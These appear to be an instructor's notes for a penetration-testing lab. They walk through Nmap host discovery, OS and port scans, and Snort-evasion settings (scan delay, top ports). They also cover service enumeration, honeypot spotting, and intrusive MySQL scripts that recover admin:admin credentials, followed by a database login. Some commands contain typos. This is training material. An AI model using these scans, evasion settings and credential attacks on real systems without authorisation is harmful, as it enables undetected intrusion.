# Nmap 
### Challenge 1: Lab Access! <link>

1. Lab navigation, menu, copy & paste

`crtl+alt+shift` (Windows)

`crtl+shift+cmd` (Mac) 


### Challenge 2: Discover Live Hosts 

Network diagram: 


	
1. Environment and multiple-console set up: 

`screen -t NMAP`
  
`screen -t TCPDUMP`

`ctrl + a` `0` NMAP

`ctrl + a` `1` TCPDUMP

`ctrl + a` `"` all 

`cd challenge 2`  

2. find the subnets: 
`cat -/challenge2/subnet-targets`


3. run TCPDUMP: 
	`sudo tcpdump -n -c 1000 -vvv -X icmp`

4. NMAP: discovery scan, specifying the use of ICMP echo requests
	`sudo nmap -n -PE -sn –max-retries 1 -iL subnet-targets -vvv`

5. Let’s restart tcpdump for the next scan 
`sudo tcpdump -nn -X -c 10 src net 172.31.0.0/16 and dst net 172.31.0.0/16 and not port 53’

6. Perform a half-open, syn scan
`sudo nmap -n -Pn --randomize-hosts --data-length 0 --max-retries 1 -sS -p 22,80,443,3389 -iL ~/challenge2/subnet-targets -oA network-discovery-results -vvv`

check out tcpdump while scan is running - see [S] syn flag
nmap results show all hosts are up! whhaat?
This is Nmap’s interpretation of the hosts' statuses assumed up because you manually chose to prevent Nmap from performing the discovery scan, opting instead for your own version of a discovery scan after the ICMP echo request scan failed.

To find hosts with a TTL response, use this command:
cat network-discovery-results.nmap | grep ttl -B 5


Found our 4 targets! WRITE DOWN THESE IP’S!

Challenge 3: OS and Open Port Identification 

Set up new screen instances 
Screen -X quit
screen -t NMAP
screen -t SNORT

cd ../challenge3 

cat host-targets

We can use Nmap’s os detection (-O flag) but it’s usually caught by IDS/IPS. We’ll see this in snort. 

sudo snort -A console -h 172.31.37.0/24,172.31.64.0/24 -c /etc/snort/snort.conf

default os detection scan
sudo nmap -) -Pn -sS -iL ~/challenge3/host-targets -vvv

check the rules thrown in snort! cause because standard -sS scan checks the top 1000 ports. 

let’s start a new snort session 

sudo snort -A console -h 172.31.37.0/24,172.31.64.0/24 -c /etc/snort/snort.conf

Let’s attempt to evade detection this time! adding a scan deley and only checking the top 100 ports

sudo nmap --max-retries 1 --data-length 0 -n --scan-delay 0.26 -Pn --top-ports 100 -sS -iL host-targets -oA ~/challenge3/port-target-results -vvv


Not a single snort rule triggered! whoop! 
[close snort] 

cat port-target-results.nmap | more

Take Notes! write down the open ports next to each IP 

Challenge 4: Service Enumeration 

Let’s take a look at where we are: 





Start snort 
sudo snort -A console -h 172.31.37.0/24,172.31.64.0/24 -c /etc/snort/snort.conf

cd ../challenge 4

cat port-targets

Discuss open ports
When you view the results from the individual host scans, you see that each is open on port 22; however, the remaining ports are different. This indicates that each server has different functions. Does anyone know what port 22 is? 

The device in the 172.31.64.0/24 subnet has open ports associated with Windows services but has the wrong TTL (64 instead of 128). TTL Linux is 64 Windows is 128 - Kind of a cool way to determine OS’s just by TTL. 
So if each port 22 comes back with the same service, it is highly likely that this is not a Windows box.  hmmm.. phishy, phishy. 

Based on the spread of ports and the low number of targets, you will simply do one scan per host. 
Run this against the first IP, insert IP and open ports. 
sudo nmap -sV -Pn -p <port1>,<port2> <1st target ip> -oA service-80-results -vvv

Let’s inspect the services returned. 
port 22 shows open SSH
port 80 shows apache web service 

Run IP # 2
sudo nmap -sV -Pn -p <port1>,<port2> <insert ip 2> -oA service-8080-results -vvv
port 22 openssh 
port 8080 apache tomcat 

Run IP # 3
sudo nmap -sV -Pn -p <port1>,<port2> <insert ip 3> -oA service-3306-results -vvv
port 22 openssh
port 3306 mysql clue here on what next steps should be

Run IP # 4
sudo nmap -sV -Pn -p <open ports> <ip 4> -oA service-jumpbox-results -vvv

While this last scan runs, go check snort. BLANK! no rules caught it. evading detections you sneaky hackers. 
Port 22 openssh 
Port 1433 ms-sql-s? 
port 3389 ms-web-server
port 5985 wsman 
question marks… 3 services unrecognized but returned data.. same port 22 response
check out the service fingerprints… strange windows service names… Any guesses what this is? 
It’s a trap! 
Take Notes add services to each IP, remove the honeypot IP from your target list. 


Challenge 5: Vulnerability enumeration and exploitation 

Ok so we have three IPs with services that may be vulnerable - SSH, HTTP, MySQL. We can run nmap scripts on each to find out which are vulnerable. 
Due to time, I’m going to spoil the surprise and tell you MySQL is the vulnerable service here. 

screen -X quit
cd ../challenge5

Let’s look at all the nmap scripts available and categories 
ls /usr/share/nmap/scripts | more
cat service-targets

Start with the safe script! 
sudo nmap --script="*mysql* and safe" -Pn -sV -p 3306 <insert mysql ip> -vvv

analyze results… successful connection made, check out info! time to be risky and exploit

sudo nmap -Pn --script="*mysql*" -sV -p 3306 <insert mysql ip> -oA mysql-intrusive-results -vvv
cat mysql-intrusive-results.nmap | more

Boom! You got credentials!! admin:admin
continue searching through the results, you can see database settings, tables, users, etc. 
While this is noisy and likely detectable, does it matter? 

sudo mysql -h <mysql ip> -uadmin -padmin 
type show databases

You are in! access to the sql database. 
take notes you want to take screenshots, show results, write your process down for the client to show the vulnerabilities, show the impact. 

